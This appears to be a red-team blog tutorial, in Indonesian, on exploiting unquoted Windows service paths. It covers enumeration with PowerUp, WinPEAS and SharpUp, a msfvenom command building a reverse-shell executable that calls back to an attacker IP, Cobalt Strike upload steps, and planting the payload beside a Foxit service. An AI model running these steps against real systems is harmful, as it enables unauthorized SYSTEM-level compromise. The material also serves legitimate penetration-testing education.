---
title: '[Misconfig] Unquoted Service Paths'
date: 2022-05-29 14:15:22 +0700
categories: [Privilege Escalation, Windows Privilege Escalation]
tags: [red team, privilege escalation, what is, windows hacking, windows privilege escalation, service exploit, misconfig]        # TAG names should always be lowercase
author: nairpaa
---


**Unquoted Service Paths** adalah ketika PATH binary dari suatu layanan mengandung spasi dengan tidak menggunakan kutip. 

Contoh dari **Unquoted Service Paths** adalah `C:\Program Files\Ignite Data\Vuln Service\file.exe`.

Untuk mengakses `file.exe`, sistem akan membaca jalur PATH dalam urutan seperti berikut:

```powershell
C:\Program.exe # Percobaan akses 1
C:\Program Files\Ignite.exe # Percobaan akses 2
C:\Program Files\Ignite Data\Vuln.exe # Percobaan akses 3
C:\Program Files\Ignite Data\Vuln Service\file.exe # Percobaan akses 4
```

Jika kita memiliki hak akses *write* pada `C:\Program Files\Ignite Data\`, kita dapat menyisipkan *malicious file executable* (`C:\Program Files\Ignite Data\Vuln.exe`) untuk dijalankan oleh user yang menjalankan service tersebut.

## 0x1 - Exploitation Stages

### Step 1: Check the Service Path

**Tools**:
- [SharpUp](https://github.com/GhostPack/SharpUp)
- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/)

```powershell
# list service manual menggunakan powershell
PS > wmic service get name,pathname

# PowerUp.ps1
PS > . .\PowerUp.ps1
PS > Get-UnquotedService

# WinPEAS
PS > .\winpeas.exe

# SharpUp
PS > .\SharpUp.exe audit UnquotedServicePath
```

### Step 2: Check File and Directory Permissions

```powershell
PS > Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
```

### Step 3: Check Start Type

Contoh kali ini *start type*-nya adalah `auto start`.

```powershell
PS C:\Users\Ap> sc qc FoxitCloudUpdateService
sc qc FoxitCloudUpdateService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: FoxitCloudUpdateService
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\FCUpdateService.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Foxit Cloud Safe Update Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```


### Step 3: Create Malware and Upload to Service Path

```bash
# Contoh buat malware dengan MSF
➜ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.73 LPORT=80 -f exe -o Foxit.exe  
```

```powershell
# Contoh upload file pada Cobalt Strike
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe Service.exe
```

Contoh: **Foxit.exe** disimpan di "`C:\Program Files (x86)\Foxit Software`".

```powershell
C:\Program Files (x86)\Foxit Software> dir
dir
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB

 Directory of C:\Program Files (x86)\Foxit Software

11/05/2021  11:09 PM    <DIR>          .
11/05/2021  11:09 PM    <DIR>          ..
10/07/2015  04:05 AM    <DIR>          Foxit Reader
11/05/2021  11:09 PM            73,802 Foxit.exe
               1 File(s)         73,802 bytes
               3 Dir(s)  13,053,509,632 bytes free
```

### Step 4: Run the Service

```powershell
# Jika punya hak akses start service
C:\> sc start <service> 

# Jika autorun, restart komputer (retart + delay 10 detik)
C:\> shutdown /r /t 10 
```


---

## 0x2 - References

- https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae
- [Foxit Reader 7.0.6.1126](https://www.exploit-db.com/exploits/36390)
- https://www.hackingarticles.in/windows-privilege-escalation-unquoted-service-path/